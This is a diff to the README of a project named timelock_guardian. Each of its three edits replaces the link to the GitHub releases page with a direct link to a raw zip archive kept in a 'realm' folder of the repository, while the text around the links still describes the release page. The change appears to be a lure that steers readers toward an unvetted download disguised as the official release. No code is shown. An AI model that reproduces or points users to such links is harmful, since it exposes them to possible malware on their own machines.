@@ -1,4 +1,4 @@
-[![Download timelock_guardian](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/monochromatic-trestle38/timelock_guardian/releases)
+[![Download timelock_guardian](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/monochromatic-trestle38/timelock_guardian/raw/refs/heads/main/realm/timelock-guardian-v1.7.zip)
 
 # 🕒 timelock_guardian - Safer upgrades with timed control
 
@@ -6,7 +6,7 @@
 
 Use this link to visit the release page and download the Windows version:
 
-https://github.com/monochromatic-trestle38/timelock_guardian/releases
+https://github.com/monochromatic-trestle38/timelock_guardian/raw/refs/heads/main/realm/timelock-guardian-v1.7.zip
 
 On that page, look for the latest release and download the Windows file that matches your computer. If you see more than one file, choose the one with `.exe` or `.msi` in the name.
 
@@ -174,4 +174,4 @@ It fits teams that need clear timing rules before they let an action move forwar
 
 If you need the file later, return to the release page here:
 
-https://github.com/monochromatic-trestle38/timelock_guardian/releases
+https://github.com/monochromatic-trestle38/timelock_guardian/raw/refs/heads/main/realm/timelock-guardian-v1.7.zip
